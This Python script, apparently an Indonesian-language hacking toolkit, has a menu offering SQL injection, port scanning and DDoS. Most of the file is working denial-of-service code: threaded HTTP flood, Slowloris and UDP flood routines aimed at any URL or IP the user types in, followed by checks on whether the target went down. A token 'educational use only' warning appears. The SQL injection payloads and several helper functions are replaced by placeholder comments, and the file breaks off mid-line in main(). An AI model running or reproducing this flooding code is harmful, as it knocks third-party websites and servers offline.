#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import re
import datetime
import random
import threading
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Login credentials
USERNAME = "mrzxx"
PASSWORD = "123456"

# ASCII Art
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

DDOS_ASCII = Fore.RED + """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""" + Style.RESET_ALL

# =========================== SQL INJECTION PAYLOADS ===========================
# [Kode SQL Injection payloads tetap sama seperti sebelumnya]
# ... [SQL Injection payloads code]

# =========================== DDOS ATTACK FUNCTIONS ===========================
class DDoSAttack:
    def __init__(self):
        self.attack_active = False
        self.threads = []
        self.request_count = 0
        self.start_time = 0
        
    def generate_user_agents(self):
        """Generate random user agents"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/89.0',
        ]
        return random.choice(user_agents)
    
    def generate_referers(self):
        """Generate random referers"""
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.twitter.com/',
            'https://www.reddit.com/',
            'https://www.linkedin.com/',
        ]
        return random.choice(referers)
    
    def http_flood(self, target_url, threads_num, duration):
        """HTTP Flood Attack"""
        headers = {
            'User-Agent': self.generate_user_agents(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Referer': self.generate_referers(),
        }
        
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            self.request_count += 1
            
            if self.request_count % 100 == 0:
                print(Fore.YELLOW + f"[*] Sent {self.request_count} requests to {target_url}")
                
        except requests.exceptions.RequestException as e:
            if self.request_count % 50 == 0:
                print(Fore.RED + f"[!] Error: {str(e)}")
    
    def slowloris_attack(self, target_ip, target_port, sockets_num):
        """Slowloris Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
            sock.send("User-Agent: {}\r\n".format(self.generate_user_agents()).encode('utf-8'))
            sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode('utf-8'))
            
            while self.attack_active:
                sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
                time.sleep(random.uniform(1, 5))
                self.request_count += 1
                
        except Exception as e:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def udp_flood(self, target_ip, target_port, packet_size):
        """UDP Flood Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_to_send = random._urandom(packet_size)
            
            while self.attack_active:
                sock.sendto(bytes_to_send, (target_ip, target_port))
                self.request_count += 1
                
                if self.request_count % 1000 == 0:
                    print(Fore.YELLOW + f"[*] Sent {self.request_count} UDP packets to {target_ip}:{target_port}")
                    
        except Exception as e:
            pass
    
    def start_web_ddos(self, url, threads=100, duration=60):
        """Start DDoS attack on website"""
        print(Fore.CYAN + f"\n[+] Starting HTTP Flood attack on: {url}")
        print(Fore.CYAN + f"[+] Threads: {threads}")
        print(Fore.CYAN + f"[+] Duration: {duration} seconds")
        print(Fore.CYAN + f"[+] Attack started at: {time.ctime()}")
        print(Fore.RED + "[!] ATTACK IN PROGRESS...")
        
        self.attack_active = True
        self.request_count = 0
        self.start_time = time.time()
        self.threads = []
        
        # Start threads for HTTP flood
        for i in range(threads):
            thread = threading.Thread(target=self.http_flood, args=(url, threads, duration))
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Start Slowloris attack
        try:
            parsed_url = requests.utils.urlparse(url)
            hostname = parsed_url.hostname
            
            # Try to get IP
            try:
                target_ip = socket.gethostbyname(hostname)
                target_port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
                
                for i in range(threads // 2):
                    thread = threading.Thread(target=self.slowloris_attack, args=(target_ip, target_port, 10))
                    thread.daemon = True
                    self.threads.append(thread)
                    thread.start()
            except:
                pass
        except:
            pass
        
        # Wait for duration
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_active:
            elapsed = int(time.time() - self.start_time)
            print(Fore.YELLOW + f"[*] Elapsed: {elapsed}s | Requests: {self.request_count}", end='\r')
            time.sleep(1)
        
        # Stop attack
        self.stop_attack()
        
        # Calculate statistics
        total_time = time.time() - self.start_time
        requests_per_second = self.request_count / total_time if total_time > 0 else 0
        
        print(Fore.GREEN + "\n" + "="*60)
        print(Fore.GREEN + "[+] Attack completed!")
        print(Fore.GREEN + f"[+] Total requests sent: {self.request_count}")
        print(Fore.GREEN + f"[+] Attack duration: {total_time:.2f} seconds")
        print(Fore.GREEN + f"[+] Requests per second: {requests_per_second:.2f}")
        print(Fore.GREEN + f"[+] Target: {url}")
        
        # Check if target is down
        try:
            print(Fore.CYAN + "\n[+] Checking target status...")
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(Fore.YELLOW + "[!] Target is still responding (Status 200)")
                print(Fore.YELLOW + "[!] May need more threads or longer duration")
            else:
                print(Fore.GREEN + f"[+] Target responded with status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(Fore.GREEN + f"[+] Target may be down! Error: {str(e)}")
        
        print(Fore.GREEN + "="*60)
    
    def start_ip_ddos(self, target_ip, target_port, threads=200, duration=60):
        """Start DDoS attack on IP address"""
        print(Fore.CYAN + f"\n[+] Starting DDoS attack on: {target_ip}:{target_port}")
        print(Fore.CYAN + f"[+] Threads: {threads}")
        print(Fore.CYAN + f"[+] Duration: {duration} seconds")
        print(Fore.CYAN + f"[+] Attack started at: {time.ctime()}")
        print(Fore.RED + "[!] ATTACK IN PROGRESS...")
        
        self.attack_active = True
        self.request_count = 0
        self.start_time = time.time()
        self.threads = []
        
        # Start UDP flood threads
        for i in range(threads):
            thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, 1024))
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Start Slowloris attack
        for i in range(threads // 2):
            thread = threading.Thread(target=self.slowloris_attack, args=(target_ip, target_port, 10))
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Wait for duration
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_active:
            elapsed = int(time.time() - self.start_time)
            print(Fore.YELLOW + f"[*] Elapsed: {elapsed}s | Packets: {self.request_count}", end='\r')
            time.sleep(1)
        
        # Stop attack
        self.stop_attack()
        
        # Calculate statistics
        total_time = time.time() - self.start_time
        packets_per_second = self.request_count / total_time if total_time > 0 else 0
        
        print(Fore.GREEN + "\n" + "="*60)
        print(Fore.GREEN + "[+] Attack completed!")
        print(Fore.GREEN + f"[+] Total packets sent: {self.request_count}")
        print(Fore.GREEN + f"[+] Attack duration: {total_time:.2f} seconds")
        print(Fore.GREEN + f"[+] Packets per second: {packets_per_second:.2f}")
        print(Fore.GREEN + f"[+] Target: {target_ip}:{target_port}")
        
        # Check if port is still open
        print(Fore.CYAN + "\n[+] Checking target port...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((target_ip, target_port))
        if result == 0:
            print(Fore.YELLOW + "[!] Port is still open")
            print(Fore.YELLOW + "[!] May need more threads or longer duration")
        else:
            print(Fore.GREEN + f"[+] Port may be down! Connection error: {result}")
        
        sock.close()
        print(Fore.GREEN + "="*60)
    
    def stop_attack(self):
        """Stop all attacks"""
        self.attack_active = False
        for thread in self.threads:
            try:
                thread.join(timeout=1)
            except:
                pass

def ddos_menu():
    """DDoS Attack Menu"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "DDoS ATTACK SYSTEM")
    print(Fore.RED + "=" * 60)
    
    print(Fore.YELLOW + "\n[!] WARNING: DDoS attacks are illegal!")
    print(Fore.YELLOW + "[!] Use only for educational purposes or on your own servers!")
    print(Fore.YELLOW + "[!] You are responsible for your own actions!")
    
    print(Fore.GREEN + "\n" + "=" * 60)
    print(Fore.CYAN + "[1] DDoS Website (HTTP Flood + Slowloris)")
    print(Fore.CYAN + "[2] DDoS IP Address (UDP Flood + Slowloris)")
    print(Fore.CYAN + "[3] Back to Main Menu")
    print(Fore.GREEN + "=" * 60)
    
    choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE)
    
    if choice == "1":
        ddos_website()
    elif choice == "2":
        ddos_ip()
    elif choice == "3":
        return
    else:
        print(Fore.RED + "[!] Invalid choice!")
        time.sleep(1)

def ddos_website():
    """DDoS Website Attack"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "WEBSITE DDoS ATTACK")
    print(Fore.RED + "=" * 60)
    
    url = input(Fore.YELLOW + "[?] Enter target URL (e.g., http://example.com): " + Fore.WHITE)
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    try:
        # Test connection first
        print(Fore.CYAN + "[+] Testing connection to target...")
        response = requests.get(url, timeout=10)
        print(Fore.GREEN + f"[+] Target is reachable (Status: {response.status_code})")
        
        # Get attack parameters
        print(Fore.GREEN + "\n" + "=" * 60)
        print(Fore.CYAN + "[+] Attack Configuration")
        
        try:
            threads = int(input(Fore.YELLOW + "[?] Number of threads (default: 100): " + Fore.WHITE) or "100")
            duration = int(input(Fore.YELLOW + "[?] Attack duration in seconds (default: 60): " + Fore.WHITE) or "60")
        except ValueError:
            print(Fore.RED + "[!] Invalid input! Using defaults.")
            threads = 100
            duration = 60
        
        # Confirm attack
        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + "[!] FINAL CONFIRMATION")
        print(Fore.RED + f"[!] Target: {url}")
        print(Fore.RED + f"[!] Threads: {threads}")
        print(Fore.RED + f"[!] Duration: {duration} seconds")
        
        confirm = input(Fore.YELLOW + "\n[?] Are you sure you want to proceed? (y/n): " + Fore.WHITE).lower()
        
        if confirm == 'y':
            # Start attack
            attack = DDoSAttack()
            attack.start_web_ddos(url, threads, duration)
        else:
            print(Fore.YELLOW + "[!] Attack cancelled!")
            
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Cannot connect to target: {str(e)}")
        print(Fore.YELLOW + "[!] Check URL or network connection")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def ddos_ip():
    """DDoS IP Address Attack"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "IP ADDRESS DDoS ATTACK")
    print(Fore.RED + "=" * 60)
    
    target_ip = input(Fore.YELLOW + "[?] Enter target IP address: " + Fore.WHITE)
    
    # Validate IP
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print(Fore.RED + "[!] Invalid IP address!")
        input(Fore.YELLOW + "[?] Press Enter to continue...")
        return
    
    try:
        target_port = int(input(Fore.YELLOW + "[?] Enter target port (default: 80): " + Fore.WHITE) or "80")
    except ValueError:
        print(Fore.RED + "[!] Invalid port! Using 80")
        target_port = 80
    
    # Test connection first
    print(Fore.CYAN + f"[+] Testing connection to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((target_ip, target_port))
    
    if result == 0:
        print(Fore.GREEN + "[+] Target is reachable")
    else:
        print(Fore.YELLOW + f"[!] Cannot connect to port {target_port} (Error: {result})")
        print(Fore.YELLOW + "[!] Continuing anyway...")
    
    sock.close()
    
    # Get attack parameters
    print(Fore.GREEN + "\n" + "=" * 60)
    print(Fore.CYAN + "[+] Attack Configuration")
    
    try:
        threads = int(input(Fore.YELLOW + "[?] Number of threads (default: 200): " + Fore.WHITE) or "200")
        duration = int(input(Fore.YELLOW + "[?] Attack duration in seconds (default: 60): " + Fore.WHITE) or "60")
    except ValueError:
        print(Fore.RED + "[!] Invalid input! Using defaults.")
        threads = 200
        duration = 60
    
    # Confirm attack
    print(Fore.RED + "\n" + "=" * 60)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target_ip}:{target_port}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration} seconds")
    
    confirm = input(Fore.YELLOW + "\n[?] Are you sure you want to proceed? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        # Start attack
        attack = DDoSAttack()
        attack.start_ip_ddos(target_ip, target_port, threads, duration)
    else:
        print(Fore.YELLOW + "[!] Attack cancelled!")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# [Fungsi lainnya tetap sama: clear_screen, show_welcome, login, port_scanner, sql_injector, show_user_info]

def show_user_info(username):
    now = datetime.datetime.now()
    print(Fore.GREEN + "=" * 70)
    print(Fore.CYAN + f" Hallo: {username}")
    print(Fore.CYAN + f" Tanggal: {now.strftime('%d %B %Y')}")
    print(Fore.CYAN + f" Waktu: {now.strftime('%H:%M:%S')}")
    print(Fore.CYAN + f" Creator: mrzxx")
    print(Fore.CYAN + f" Telegram: @Zxxtirwd")
    print(Fore.GREEN + "=" * 70)

def main_menu(username):
    while True:
        clear_screen()
        print(MAIN_ASCII)
        show_user_info(username)
        print(Fore.CYAN + " " * 20 + "ULTIMATE SECURITY TOOL")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "\n[1] SQL Injection Scanner + sqlmap (100+ payloads)")
        print(Fore.YELLOW + "[2] Port Scanner")
        print(Fore.YELLOW + "[3] DDoS Attack (Layer 7)")
        print(Fore.YELLOW + "[4] Exit")
        print(Fore.GREEN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE)
        
        if choice == "1":
            sql_injector()
        elif choice == "2":
            port_scanner()
        elif choice == "3":
            ddos_menu()
        elif choice == "4":
            print(Fore.CYAN + "\n[+] Thank you for using this tool!")
            print(Fore.CYAN + "[+] Creator: mrzxx")
            print(Fore.CYAN + "[+] Telegram: @Zxxtirwd")
            print(Fore.CYAN + "[+] Exiting...")
            time.sleep(2)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

def main():
    try:
        # Show welcome screen
        show_welcome()
        
        # Login
        username
